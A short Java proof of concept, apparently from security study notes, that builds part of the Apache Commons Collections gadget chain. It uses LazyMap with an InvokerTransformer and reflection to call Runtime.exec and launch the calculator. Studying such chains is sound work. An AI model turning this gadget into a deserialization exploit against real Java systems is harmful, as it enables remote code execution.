
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

// 用 decorate 触发弹计算器，确保此链可用
public class LazyMapEXP {
    public static void main(String[] args) throws Exception{
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
        lazyGetMethod.setAccessible(true);
        lazyGetMethod.invoke(decorateMap, runtime);
    }
}
